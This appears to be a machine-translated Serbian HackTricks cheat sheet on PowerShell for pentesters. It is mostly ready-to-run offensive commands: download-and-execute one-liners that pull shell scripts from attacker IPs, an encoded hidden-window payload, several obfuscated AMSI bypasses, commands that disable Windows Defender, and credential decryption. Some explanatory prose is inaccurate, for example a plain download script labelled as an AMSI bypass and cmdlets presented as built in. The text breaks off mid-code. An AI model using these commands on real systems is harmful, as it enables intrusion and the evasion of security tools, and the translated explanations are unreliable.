# Basic PowerShell for Pentesters

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Podrazumevane lokacije PowerShell-a

```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```

## Osnovne PS komande za po캜etak

Ovde su neke osnovne PowerShell (PS) komande koje mo쬰te koristiti za po캜etak:

* `Get-Process`: Prikazuje sve pokrenute procese na sistemu.
* `Get-Service`: Prikazuje sve pokrenute servise na sistemu.
* `Get-EventLog`: Prikazuje doga캠aje iz sistemskog loga.
* `Get-WmiObject`: Prikazuje informacije o Windows Management Instrumentation (WMI) objektima.
* `Get-ChildItem`: Prikazuje sadr쬬j direktorijuma.
* `Set-Location`: Menja trenutni direktorijum.
* `Get-Help`: Prikazuje pomo캖 za odre캠enu komandu.
* `Invoke-Command`: Izvr코ava komandu na udaljenom ra캜unaru.
* `New-Item`: Kreira novi fajl ili direktorijum.
* `Remove-Item`: Bri코e fajl ili direktorijum.

Ove komande su samo osnovne i postoji mnogo vi코e mogu캖nosti koje mo쬰te istra쬴ti.

```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```

## Preuzimanje i izvr코avanje

U ovom odeljku 캖emo se baviti tehnikom preuzimanja i izvr코avanja fajlova putem PowerShell-a. Ova tehnika je korisna u situacijama kada 쬰lite da preuzmete i pokrenete fajl sa udaljenog servera.

### Preuzimanje fajla

Da biste preuzeli fajl sa udaljenog servera, mo쬰te koristiti slede캖u PowerShell komandu:

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <putanja_do_fajla>
```

Zamijenite `<URL>` sa URL-om fajla koji 쬰lite da preuzmete, i `<putanja_do_fajla>` sa putanjom na kojoj 쬰lite da sa캜uvate preuzeti fajl.

### Izvr코avanje preuzetog fajla

Nakon 코to preuzmete fajl, mo쬰te ga izvr코iti pomo캖u PowerShell komande `Start-Process`. Evo kako to mo쬰te uraditi:

```powershell
Start-Process -FilePath <putanja_do_fajla>
```

Zamijenite `<putanja_do_fajla>` sa putanjom do preuzetog fajla koji 쬰lite da izvr코ite.

### Primer

Evo primera kako mo쬰te preuzeti i izvr코iti fajl koriste캖i PowerShell:

```powershell
Invoke-WebRequest -Uri http://www.example.com/malicious.exe -OutFile C:\Temp\malicious.exe
Start-Process -FilePath C:\Temp\malicious.exe
```

Ovaj primer preuzima fajl `malicious.exe` sa `http://www.example.com` i 캜uva ga na putanji `C:\Temp\malicious.exe`. Zatim, koristi se `Start-Process` komanda da bi se izvr코io preuzeti fajl.

Napomena: Ova tehnika mo쬰 biti zloupotrebljena i koristiti se u zlonamerne svrhe. Uvek budite oprezni prilikom preuzimanja i izvr코avanja fajlova sa nepoznatih izvora.

```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```

### Preuzimanje i izvr코avanje u pozadini sa AMSI zaobilaznicom

Ovaj tehniku omogu캖ava preuzimanje i izvr코avanje zlonamernog koda u pozadini, zaobilaze캖i AMSI (Antimalware Scan Interface) za코titu. Slede캖i PowerShell skript demonstrira ovu tehniku:

```powershell
$URL = "http://www.maliciouswebsite.com/malware.exe"
$Output = "C:\Temp\malware.exe"

# Kreiranje objekta za preuzimanje
$WebClient = New-Object System.Net.WebClient

# Preuzimanje zlonamernog fajla
$WebClient.DownloadFile($URL, $Output)

# Izvr코avanje zlonamernog fajla u pozadini
$Process = New-Object System.Diagnostics.Process
$Process.StartInfo.FileName = $Output
$Process.StartInfo.WindowStyle = "Hidden"
$Process.Start()
```

Ovaj skript prvo kreira objekat WebClient koji se koristi za preuzimanje zlonamernog fajla sa odre캠ene URL adrese. Zatim se fajl izvr코ava u pozadini pomo캖u objekta Process.

Napomena: Ova tehnika zaobilazi AMSI za코titu, ali ne garantuje 100% uspeh. AMSI je mo캖an alat za detekciju malvera i mo쬰 otkriti neke vrste zlonamernog koda.

```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```

### Kori코캖enje b64 sa Linuxa

Ako 쬰lite da koristite `b64` komandu sa Linux operativnog sistema, mo쬰te je koristiti na slede캖i na캜in:

```bash
echo -n "Tekst za enkodiranje" | base64
```

Ova komanda 캖e enkodirati tekst koji ste naveli koriste캖i Base64 enkodiranje. Rezultat 캖e biti prikazan na standardnom izlazu.

Da biste dekodirali Base64 enkodirani tekst, mo쬰te koristiti slede캖u komandu:

```bash
echo -n "Enkodirani tekst" | base64 -d
```

Ova komanda 캖e dekodirati enkodirani tekst koriste캖i Base64 dekodiranje i prikazati rezultat na standardnom izlazu.

```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```

## Preuzimanje

### System.Net.WebClient

```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```

### Invoke-WebRequest

Invoke-WebRequest je PowerShell cmdlet koji se koristi za slanje HTTP zahteva na web servere i dobijanje odgovora. Ovaj cmdlet se 캜esto koristi u pentestiranju za interakciju sa web aplikacijama i izvr코avanje razli캜itih akcija kao 코to su preuzimanje fajlova, slanje podataka na server ili 캜ak izvr코avanje napada.

Evo nekoliko primera kako mo쬰te koristiti Invoke-WebRequest:

1. Preuzimanje fajla sa web servera:

```powershell
Invoke-WebRequest -Uri "http://www.example.com/file.txt" -OutFile "C:\path\to\save\file.txt"
```

2. Slanje podataka na server:

```powershell
Invoke-WebRequest -Uri "http://www.example.com/submit" -Method POST -Body "username=admin&password=pass123"
```

3. Izvr코avanje GET zahteva i prikazivanje odgovora:

```powershell
$response = Invoke-WebRequest -Uri "http://www.example.com"
$response.Content
```

4. Izvr코avanje napada poput SQL injection-a:

```powershell
$payload = "admin' OR '1'='1'--"
Invoke-WebRequest -Uri "http://www.example.com/login?username=$payload&password=pass123"
```

Ovaj cmdlet pru쬬 mnoge mogu캖nosti za interakciju sa web serverima i mo쬰 biti veoma koristan alat u arsenalu pentestera.

```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```

### Wget

Wget je besplatan alat za preuzimanje sadr쬬ja sa weba. Mo쬰 se koristiti za preuzimanje datoteka, rekurzivno preuzimanje celih veb lokacija, kao i za preuzimanje preko HTTP, HTTPS i FTP protokola.

#### Instalacija

Wget je dostupan za Windows operativni sistem i mo쬰 se preuzeti sa zvani캜ne veb stranice projekta. Nakon preuzimanja, instalacija se vr코i pokretanjem instalacionog fajla i pra캖enjem uputstava na ekranu.

#### Kori코캖enje

Da biste preuzeli datoteku sa weba koriste캖i Wget, koristite slede캖u sintaksu:

```
wget <URL>
```

Gde `<URL>` predstavlja adresu datoteke koju 쬰lite da preuzmete.

#### Primeri

1. Preuzimanje datoteke `file.txt` sa weba:

```
wget http://www.example.com/file.txt
```

2. Rekurzivno preuzimanje celog sadr쬬ja veb lokacije:

```
wget --recursive http://www.example.com
```

3. Preuzimanje datoteke preko FTP protokola:

```
wget ftp://ftp.example.com/file.txt
```

#### Napredne opcije

Wget ima mnoge napredne opcije koje vam omogu캖avaju da prilagodite proces preuzimanja. Za vi코e informacija o ovim opcijama, pogledajte dokumentaciju Wget alata.

```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```

### BitsTransfer

BitsTransfer je PowerShell modul koji omogu캖ava prenos datoteka izme캠u ra캜unara putem Background Intelligent Transfer Service (BITS) protokola. Ovaj modul je veoma koristan za prenos velikih datoteka i omogu캖ava vam da pratite napredak prenosa, pauzirate i nastavite prenos, kao i da upravljate prioritetima prenosa.

Da biste koristili BitsTransfer modul, prvo morate da ga u캜itate u PowerShell sesiju. To mo쬰te uraditi pomo캖u komande `Import-Module BitsTransfer`. Nakon toga, mo쬰te koristiti razli캜ite komande za upravljanje prenosom datoteka.

#### Komande za BitsTransfer

* `Start-BitsTransfer`: Ova komanda se koristi za pokretanje prenosa datoteka. Morate navesti izvor i odredi코te datoteke, kao i putanju do log fajla koji 캖e pratiti napredak prenosa.
* `Get-BitsTransfer`: Ova komanda se koristi za dobijanje informacija o trenutnim prenosima datoteka. Mo쬰te videti informacije kao 코to su napredak prenosa, brzina prenosa i status prenosa.
* `Complete-BitsTransfer`: Ova komanda se koristi za zavr코etak prenosa datoteka. Mo쬰te je koristiti kada 쬰lite da prekinete prenos ili kada je prenos zavr코en.
* `Suspend-BitsTransfer`: Ova komanda se koristi za pauziranje prenosa datoteka. Mo쬰te je koristiti kada 쬰lite da privremeno zaustavite prenos i nastavite ga kasnije.
* `Resume-BitsTransfer`: Ova komanda se koristi za nastavak prenosa datoteka koji je bio pauziran. Mo쬰te je koristiti kada 쬰lite da nastavite prenos nakon pauze.

#### Primeri kori코캖enja BitsTransfer

Evo nekoliko primera kako mo쬰te koristiti BitsTransfer modul:

1. Pokretanje prenosa datoteke:

```powershell
Start-BitsTransfer -Source "C:\putanja\do\izvorne\datoteke" -Destination "C:\putanja\do\odredi코ne\datoteke" -DisplayName "Prenos datoteke" -Description "Ovo je primer prenosa datoteke"
```

2. Pauziranje prenosa datoteke:

```powershell
Suspend-BitsTransfer -DisplayName "Prenos datoteke"
```

3. Nastavak prenosa datoteke:

```powershell
Resume-BitsTransfer -DisplayName "Prenos datoteke"
```

4. Zavr코etak prenosa datoteke:

```powershell
Complete-BitsTransfer -DisplayName "Prenos datoteke"
```

5. Dobijanje informacija o trenutnim prenosima datoteka:

```powershell
Get-BitsTransfer
```

BitsTransfer modul je veoma koristan alat za prenos datoteka putem PowerShell-a. Mo쬰te ga koristiti za efikasan prenos velikih datoteka i pratiti napredak prenosa.

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

## Base64 Kali & EncodedCommand

### Base64 Kali

Kali Linux ima ugra캠enu funkcionalnost za enkodiranje i dekodiranje Base64. Ovo je korisno kada 쬰lite da enkodirate ili dekodirate tekst ili binarne podatke koriste캖i Base64 algoritam.

Da biste enkodirali tekst u Base64 format, mo쬰te koristiti slede캖u komandu:

```bash
echo -n "Tekst za enkodiranje" | base64
```

Da biste dekodirali Base64 kodirani tekst, koristite slede캖u komandu:

```bash
echo -n "Base64 kodirani tekst" | base64 -d
```

### EncodedCommand

PowerShell omogu캖ava izvr코avanje skripti koriste캖i parametar `-EncodedCommand`. Ovaj parametar omogu캖ava enkodiranje PowerShell skripte u Base64 format, 코to je korisno kada 쬰lite da izvr코ite skriptu na na캜in koji izbegava detekciju antivirusnih programa.

Da biste enkodirali PowerShell skriptu u Base64 format, mo쬰te koristiti slede캖i PowerShell kod:

```powershell
$script = "Write-Host 'Hello, World!'"
$encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
```

Zatim, mo쬰te izvr코iti enkodiranu skriptu koriste캖i slede캖u komandu:

```powershell
powershell.exe -EncodedCommand <enkodirana_skripta>
```

Gde `<enkodirana_skripta>` predstavlja enkodiranu PowerShell skriptu koju 쬰lite da izvr코ite.

```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```

## [Izvr코na politika](../authentication-credentials-uac-and-efs/#ps-execution-policy)

## [Ograni캜eni jezik](https://github.com/carlospolop/hacktricks/blob/rs/windows-hardening/basic-powershell-for-pentesters/broken-reference/README.md)

## [AppLocker politika](https://github.com/carlospolop/hacktricks/blob/rs/windows-hardening/basic-powershell-for-pentesters/broken-reference/README.md)

## Omogu캖i WinRM (udaljeni PS)

```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```

## Onemogu캖i Defender

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### AMSI zaobila쬰nje

**`amsi.dll`** se **u캜itava** u va코 proces i ima neophodne **izvoze** za interakciju sa bilo kojom aplikacijom. I zato 코to se u캜itava u memorijski prostor procesa koji **kontroli코ete**, mo쬰te promeniti njegovo pona코anje tako 코to 캖ete **prepisati instrukcije u memoriji**. Na taj na캜in se onemogu캖ava detekcija.

Stoga, cilj AMSI zaobila쬰nja je da **prepi코ete instrukcije te DLL datoteke u memoriji kako bi detekcija postala beskorisna**.

Veb stranica za generisanje AMSI zaobila쬰nja: [**https://amsi.fail/**](https://amsi.fail/)

```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```

### AMSI Bypass 2 - Hookovanje poziva upravljanog API-ja

Pogledajte [**ovaj post za detaljne informacije i kod**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/). Uvod:

Ova nova tehnika se oslanja na hookovanje poziva API-ja .NET metoda. Ispostavlja se da .NET metode moraju biti kompajlirane u ma코inske instrukcije u memoriji koje izgledaju veoma sli캜no nativnim metodama. Ove kompajlirane metode mogu biti hookovane kako bi se promenio tok kontrole programa.

Koraci za izvo캠enje hookovanja poziva API-ja .NET metoda su:

1. Identifikacija ciljnog metoda za hookovanje
2. Definisanje metoda sa istim prototipom funkcije kao ciljni metod
3. Kori코캖enje refleksije za pronala쬰nje metoda
4. Provera da li su svi metodi kompajlirani
5. Pronala쬰nje lokacije svakog metoda u memoriji
6. Prepisivanje ciljnog metoda sa instrukcijama koje upu캖uju na na코 zlonamerni metod

### AMSI Bypass 3 - SeDebug privilegija

[Pomo캖u **ovog vodi캜a i koda**](https://github.com/MzHmO/DebugAmsi) mo쬰te videti kako, sa dovoljno privilegija za debagovanje procesa, mo쬰te pokrenuti powershell.exe proces, debagovati ga, pratiti kada u캜itava `amsi.dll` i onemogu캖iti je.

### AMSI Bypass - Dodatni resursi

* [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
* [Amsi Bypass na Windows 11 u 2023. godini](https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6) [Github](https://github.com/senzee1984/Amsi\_Bypass\_In\_2023)

## PS-Istorija

```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

## Prona캠i novije datoteke

Opcije: `CreationTime`, `CreationTimeUtc`, `LastAccessTime`, `LastAccessTimeUtc`, `LastWriteTime`, `LastWriteTimeUtc`

```powershell
# LastAccessTime:
(gci C:\ -r | sort -Descending LastAccessTime | select -first 100) | Select-Object -Property LastAccessTime,FullName

# LastWriteTime:
(gci C:\ -r | sort -Descending LastWriteTime | select -first 100) | Select-Object -Property LastWriteTime,FullName
```

## Dobijanje dozvola

Da biste dobili informacije o dozvolama za odre캠eni fajl ili direktorijum u PowerShell-u, mo쬰te koristiti slede캖e komande:

### Get-Acl

Komanda `Get-Acl` se koristi za dobijanje ACL (Access Control List) objekta koji sadr쬴 informacije o dozvolama za odre캠eni fajl ili direktorijum.

```powershell
Get-Acl -Path C:\putanja\fajl
```

### Get-NTFSAccess

Komanda `Get-NTFSAccess` se koristi za dobijanje detaljnih informacija o dozvolama za odre캠eni fajl ili direktorijum.

```powershell
Get-NTFSAccess -Path C:\putanja\fajl
```

### Get-EffectiveAccess

Komanda `Get-EffectiveAccess` se koristi za dobijanje efektivnih dozvola za odre캠eni fajl ili direktorijum, uzimaju캖i u obzir sve nasle캠ene dozvole.

```powershell
Get-EffectiveAccess -Path C:\putanja\fajl
```

### Get-ChildItem

Komanda `Get-ChildItem` se koristi za dobijanje informacija o dozvolama za sve fajlove i direktorijume unutar odre캠enog direktorijuma.

```powershell
Get-ChildItem -Path C:\putanja\direktorijum | Get-Acl
```

### Get-ACLReport

Komanda `Get-ACLReport` se koristi za generisanje izve코taja o dozvolama za odre캠eni fajl ili direktorijum.

```powershell
Get-ACLReport -Path C:\putanja\fajl -OutputFile C:\putanja\izvestaj.html
```

Napomena: Ove komande zahtevaju odgovaraju캖e privilegije za pristup fajlovima i direktorijumima.

```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```

## Verzija operativnog sistema i zakrpe

Da biste saznali verziju operativnog sistema i informacije o instaliranim zakrpama, mo쬰te koristiti slede캖e PowerShell komande:

```powershell
# Verzija operativnog sistema
(Get-WmiObject -Class Win32_OperatingSystem).Caption

# Informacije o zakrpama
Get-HotFix
```

Ova dva komandna reda 캖e vam pru쬴ti informacije o verziji operativnog sistema i sve zakrpe koje su instalirane na sistemu.

```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

## Okru쬰nje

```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```

## Ostali povezani drajvovi

Kada radite sa PowerShell-om, mo쬰te dobiti informacije o svim povezanim drajvovima na sistemu koriste캖i slede캖u komandu:

```powershell
Get-PSDrive
```

Ova komanda 캖e prikazati sve povezane drajvove, uklju캜uju캖i i lokalne drajvove, mre쬹e drajvove i virtualne drajvove.

```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

### Korpa za sme캖e

Recycle Bin (Korpa za sme캖e) je mesto na Windows operativnom sistemu gde se sme코taju obrisane datoteke i folderi. Ova funkcionalnost omogu캖ava korisnicima da povrate obrisane podatke ako su slu캜ajno izbrisali ne코to 코to im je potrebno.

Kada se datoteka ili folder obri코e, oni se premeste u Recycle Bin umesto da se trajno izbri코u sa sistema. Korisnici mogu pristupiti Recycle Binu i povratiti obrisane datoteke ili ih trajno izbrisati.

Da biste pristupili Recycle Binu, jednostavno kliknite desnim tasterom mi코a na ikonu Recycle Bin na radnoj povr코ini ili u File Exploreru i odaberite opciju "Open" (Otvori). Otvori캖e se prozor koji prikazuje sve obrisane datoteke i foldere.

Da biste povratili obrisane datoteke, jednostavno kliknite desnim tasterom mi코a na datoteku koju 쬰lite da povratite i odaberite opciju "Restore" (Povrati). Datoteka 캖e biti vra캖ena na originalno mesto gde je bila pre brisanja.

Ako 쬰lite trajno da izbri코ete obrisane datoteke, mo쬰te odabrati opciju "Empty Recycle Bin" (Isprazni korpu za sme캖e). Ova opcija 캖e trajno izbrisati sve datoteke iz Recycle Bina i osloboditi prostor na disku.

Va쬹o je napomenuti da se datoteke u Recycle Binu mogu povratiti samo dok nisu trajno izbrisane. Kada se korpa za sme캖e isprazni ili kada se datoteke izbri코u iz nje, vi코e nije mogu캖e povratiti te datoteke.

```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```

[https://jdhitsolutions.com/blog/powershell/7024/upravljanje-korpa-za-reciklazu-pomocu-powershell-a/](https://jdhitsolutions.com/blog/powershell/7024/upravljanje-korpa-za-reciklazu-pomocu-powershell-a/)

## Prikupljanje informacija o domenu

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## Korisnici

```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

## Bezbedan string u 캜ist tekst

Kada radite sa osetljivim podacima u PowerShell skriptama, va쬹o je da za코titite te podatke od neovla코캖enog pristupa. Jedan od na캜ina da to postignete je kori코캖enjem SecureString objekta za 캜uvanje osetljivih vrednosti kao 코to su lozinke.

Me캠utim, u nekim situacijama mo쬰 biti potrebno da konvertujete SecureString u 캜ist tekst radi dalje obrade ili prikaza. Evo kako to mo쬰te uraditi:

```powershell
$secureString = Read-Host -AsSecureString
$plaintext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

Prvo, koristimo `Read-Host -AsSecureString` da bismo korisniku omogu캖ili unos osetljivog podatka kao SecureString. Zatim koristimo `System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)` da bismo konvertovali SecureString u BSTR (Basic String) format.

Kona캜no, koristimo `[System.Runtime.InteropServices.Marshal]::PtrToStringAuto()` da bismo konvertovali BSTR u 캜ist tekst.

Va쬹o je napomenuti da konvertovanje SecureString u 캜ist tekst mo쬰 predstavljati sigurnosni rizik, jer osetljivi podaci mogu biti izlo쬰ni u memoriji. Stoga, budite oprezni prilikom rukovanja osetljivim podacima i koristite ovu tehniku samo kada je to zaista neophodno.

```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
